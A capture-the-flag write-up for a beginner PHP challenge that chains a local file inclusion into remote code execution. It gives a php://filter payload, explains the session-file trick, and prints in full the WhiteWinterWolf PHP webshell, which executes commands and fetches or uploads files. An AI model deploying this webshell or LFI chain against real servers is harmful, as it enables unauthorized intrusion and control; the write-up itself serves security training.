# HakkaMD Writeup

Tag: `LFI`

[http://h4ck3r.quest:8401/](http://h4ck3r.quest:8401/)

## Bug

Trivial LFI. (Since this category is mentioned in the challenge site :D)

We can view some files. Can we find `flag` or `flag.txt` under some common directory? Nope.

We have to view the whole directory.

## Leaking Source

A really well-known LFI payload:

`http://h4ck3r.quest:8401/?module=php://filter/convert.base64-encode/resource=index.php`

And we obtain `index.php`

```php
$ echo 'PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoIWlzc2V0KCRfU0VTU0lPTlsnbm90ZXMnXSkpICRfU0VTU0lPTlsnbm90ZXMnXSA9IFtdOwppZiAoIWlzc2V0KCRfR0VUWydtb2R1bGUnXSkpIGhlYWRlcigiTG9jYXRpb246IC8/bW9kdWxlPW1vZHVsZS9ob21lLnBocCIpOwo/PgoKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICAgIDx0aXRsZT5IYWtrYU1EPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9idWxtYUAwLjkuMy9jc3MvYnVsbWEubWluLmNzcyI+CjwvaGVhZD4KCjxib2R5PgogICAgPHNlY3Rpb24gY2xhc3M9InNlY3Rpb24iPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbHVtbiBpcy02IGlzLW9mZnNldC0zIj4KICAgICAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJF9HRVRbJ21vZHVsZSddKSA/PgogICAgICAgICAgICAgICAgPHA+CiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iLz9tb2R1bGU9bW9kdWxlL2hvbWUucGhwIj7pppbpoIE8L2E+IHwKICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSIvP21vZHVsZT1tb2R1bGUvbGlzdC5waHAiPuethuiomOWIl+ihqDwvYT4gfAogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ii9waHBpbmZvLnBocCI+cGhwaW5mbygpPC9hPgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvc2VjdGlvbj4KPC9ib2R5PgoKPC9odG1sPg==' | base64 -d       
<?php
session_start();
if (!isset($_SESSION['notes'])) $_SESSION['notes'] = [];
if (!isset($_GET['module'])) header("Location: /?module=module/home.php");
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HakkaMD</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
</head>

<body>
    <section class="section">
        <div class="container">
            <div class="column is-6 is-offset-3">
                <?php include($_GET['module']) ?>
                <p>
                    <a href="/?module=module/home.php">首頁</a> |
                    <a href="/?module=module/list.php">筆記列表</a> |
                    <a href="/phpinfo.php">phpinfo()</a>
                </p>
            </div>
        </div>
    </section>
</body>

</html>   
```

`home.php`

```php
$ echo 'PGRpdiBjbGFzcz0iYm94Ij4KICAgIDxoMSBjbGFzcz0idGl0bGUiPkhha2thTUQ8L2gxPgogICAgPHAgY2xhc3M9InN1YnRpdGxlIj7kuIDlgIvnsKHllq7nmoTnrYboqJjlubPlj7A8L3A+CiAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iLz9tb2R1bGU9bW9kdWxlL3Bvc3QucGhwIj4KICAgICAgICA8ZGl2IGNsYXNzPSJmaWVsZCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRyb2wiPgogICAgICAgICAgICAgICAgPHRleHRhcmVhIGNsYXNzPSJ0ZXh0YXJlYSIgdHlwZT0idGV4dCIgbmFtZT0ibm90ZSIgcGxhY2Vob2xkZXI9IldyaXRlIHlvdXIgbm90ZSBoZXJlLi4uIj48L3RleHRhcmVhPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXR0b24gaXMtaW5mbyBpcy1mdWxsd2lkdGgiPlBvc3Q8L2J1dHRvbj4KICAgIDwvZm9ybT4KPC9kaXY+' | base64 -d
<div class="box">
    <h1 class="title">HakkaMD</h1>
    <p class="subtitle">一個簡單的筆記平台</p>
    <form method="POST" action="/?module=module/post.php">
        <div class="field">
            <div class="control">
                <textarea class="textarea" type="text" name="note" placeholder="Write your note here..."></textarea>
            </div>
        </div>
        <button class="button is-info is-fullwidth">Post</button>
    </form>
</div>
```

## Finding exploitable

It seems that the Markdown function is not our goal since ~~it is too complicated~~ this is beginner-firendly challenge so make it simple and easy.

After some ~~mediumship~~ hints we can see that `session_start();` is pretty sus. (?)

And it gave us `http://h4ck3r.quest:8401/phpinfo.php` so the website is naked.(?)

We can observe that `session.save_path` is none so its in `/tmp/`. And we can see our php sesseion in the cookie. So we can view the session file in `/tmp/sess_{your_session_id_here}`.

After adding 5 notes we have observed that:

`notes|a:5:{i:0;s:3:"ooo";i:1;s:6:"second";i:2;s:7:"third ";i:3;s:4:"what";i:4;s:2:" ";}`

`a:5` means 5 notes
`i:0` 0-th note
`s:3` three letters (letter count on latter notes seems strage, that's because I typed some newline characters)
`"ooo"` is the content

## Get webshell since php session file is executable???

The gimmick is here: If we inject webshell into the note and we access the session file, we have a shell ?!

I like webshell by [WhiteWinterWolf/wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php). Or you can use reverse shell or whatever you like. Just don't destroy the infrastructures.

Then we can find the flag file under `/`, pwned.

FLAG: `FLAG{include(LFI_to_RCE)}`


## Deepdive into the website

We can dump some files out to see what happens:

```php
$ cat  /var/www/html/module/home.php /var/www/html/module/list.php /var/www/html/module/post.php
<div class="box">
    <h1 class="title">HakkaMD</h1>
    <p class="subtitle">一個簡單的筆記平台</p>
    <form method="POST" action="/?module=module/post.php">
        <div class="field">
            <div class="control">
                <textarea class="textarea" type="text" name="note" placeholder="Write your note here..."></textarea>
            </div>
        </div>
        <button class="button is-info is-fullwidth">Post</button>
    </form>
</div><h1 class="title">筆記列表</h1>
<?php foreach ($_SESSION['notes'] as $note) : ?>
    <div class="box">
        <?= nl2br($note) ?>
    </div>
<?php endforeach; ?><?php
if (isset($_POST['note'])) $_SESSION['notes'][] = $_POST['note'];
header("Location: /?module=module/list.php");
```

Hmm, what about viewing my session file again?

```php

cat /tmp/sess_REDACTED
notes|a:1:{i:0;s:7499:"#<?php
/*******************************************************************************
 * Copyright 2017 WhiteWinterWolf
 * https://www.whitewinterwolf.com/tags/php-webshell/
 *
 * This file is part of wwolf-php-webshell.
 *
 * wwwolf-php-webshell is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 ******************************************************************************/

/*
 * Optional password settings.
 * Use the 'passhash.sh' script to generate the hash.
 * NOTE: the prompt value is tied to the hash!
 */
$passprompt = "WhiteWinterWolf's PHP webshell: ";
$passhash = "";

function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }

function h($s)
{
	global $passprompt;
	if (function_exists('hash_hmac'))
	{
		return hash_hmac('sha256', $s, $passprompt);
	}
	else
	{
		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
	}
}

function fetch_fopen($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	if (strpos($host, '://') === false)
	{
		$host = 'http://' . $host;
	}
	else
	{
		$host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
	}
	$rh = fopen("${host}:${port}${src}", 'rb');
	if ($rh !== false)
	{
		$wh = fopen($dst, 'wb');
		if ($wh !== false)
		{
			$cbytes = 0;
			while (! feof($rh))
			{
				$cbytes += fwrite($wh, fread($rh, 1024));
			}
			fclose($wh);
			$ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($rh);
	}
	else
	{
		$ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
	}
	return $ret;
}

function fetch_sock($host, $port, $src, $dst)
{
	global $err, $ok;
	$ret = '';
	$host = str_replace('https://', 'tls://', $host);
	$s = fsockopen($host, $port);
	if ($s)
	{
		$f = fopen($dst, 'wb');
		if ($f)
		{
			$buf = '';
			$r = array($s);
			$w = NULL;
			$e = NULL;
			fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
			while (stream_select($r, $w, $e, 5) && !feof($s))
			{
				$buf .= fread($s, 1024);
			}
			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
			fwrite($f, $buf);
			fclose($f);
			$ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
		}
		else
		{
			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
		}
		fclose($s);
	}
	else
	{
		$ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
	}
	return $ret;
}

ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);

while (@ ob_end_clean());

if (! isset($_SERVER))
{
	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
	$_FILES = &$HTTP_POST_FILES;
	$_POST = &$HTTP_POST_VARS;
	$_SERVER = &$HTTP_SERVER_VARS;
}

$auth = '';
$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];
$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
$fetch_func = 'fetch_fopen';
$fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
$fetch_path = empty($_POST['fetch_path']) ? '' : $_POST['fetch_path'];
$fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];
$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '';
$ok = '&#9786; :';
$warn = '&#9888; :';
$err = '&#9785; :';

if (! empty($passhash))
{
	if (function_exists('hash_hmac') || function_exists('mhash'))
	{
		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
		if (h($auth) !== $passhash)
		{
			?>
				<form method="post" action="<?php e($url); ?>">
					<?php e($passprompt); ?>
					<input type="password" size="15" name="pass">
					<input type="submit" value="Send">
				</form>
			<?php
			exit;
		}
	}
	else
	{
		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
	}
}

if (! ini_get('allow_url_fopen'))
{
	ini_set('allow_url_fopen', '1');
	if (! ini_get('allow_url_fopen'))
	{
		if (function_exists('stream_select'))
		{
			$fetch_func = 'fetch_sock';
		}
		else
		{
			$fetch_func = '';
			$status .= "${warn} File fetching disabled ('allow_url_fopen'"
				. " disabled and 'stream_select()' missing).<br />";
		}
	}
}
if (! ini_get('file_uploads'))
{
	ini_set('file_uploads', '1');
	if (! ini_get('file_uploads'))
	{
		$status .= "${warn} File uploads disabled.<br />";
	}
}
if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
{
	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
}

if (! chdir($cwd))
{
  $cwd = getcwd();
}

if (! empty($fetch_func) && ! empty($fetch_path))
{
	$dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
	$status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
}

if (ini_get('file_uploads') && ! empty($_FILES['upload']))
{
	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
	{
		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
	}
}
?>

<form method="post" action="<?php e($url); ?>"
	<?php if (ini_get('file_uploads')): ?>
		enctype="multipart/form-data"
	<?php endif; ?>
	>
	<?php if (! empty($passhash)): ?>
		<input type="hidden" name="auth" value="<?php e($auth); ?>">
	<?php endif; ?>
	<table border="0">
		<?php if (! empty($fetch_func)): ?>
			<tr><td>
				<b>Fetch:</b>
			</td><td>
				host: <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php e($fetch_host); ?>">
				port: <input type="text" size="4" id="fetch_port" name="fetch_port" value="<?php e($fetch_port); ?>">
				path: <input type="text" size="40" id="fetch_path" name="fetch_path" value="">
			</td></tr>
		<?php endif; ?>
		<tr><td>
			<b>CWD:</b>
		</td><td>
			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
			<?php if (ini_get('file_uploads')): ?>
				<b>Upload:</b> <input type="file" id="upload" name="upload">
			<?php endif; ?>
		</td></tr>
		<tr><td>
			<b>Cmd:</b>
		</td><td>
			<input type="text" size="80" id="cmd" name="cmd" value="<?php e($cmd); ?>">
		</td></tr>
		<tr><td>
		</td><td>
			<sup><a href="#" onclick="cmd.value=''; cmd.focus(); return false;">Clear cmd</a></sup>
		</td></tr>
		<tr><td colspan="2" style="text-align: center;">
			<input type="submit" value="Execute" style="text-align: right;">
		</td></tr>
	</table>
	
</form>
<hr />

<?php
if (! empty($status))
{
	echo "<p>${status}</p>";
}

echo "<pre>";
if (! empty($cmd))
{
	echo "<b>";
	e($cmd);
	echo "</b>\n";
	if (DIRECTORY_SEPARATOR == '/')
	{
		$p = popen('exec 2>&1; ' . $cmd, 'r');
	}
	else
	{
		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
	}
	while (! feof($p))
	{
		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
		@ flush();
	}
}
echo "</pre>";

exit;
?>";}
```

It seems that it breaks out of the string for some reason (TBD). So actually our payloads needs to modify to break the quotation marks but due to all sorts of accidental mishaps we have the shell. Or just because the website parses the `<?php` tag so it executes php code directly.(I think this is the reason)

And we can execute php code from the website source code since this website is made of php :D.
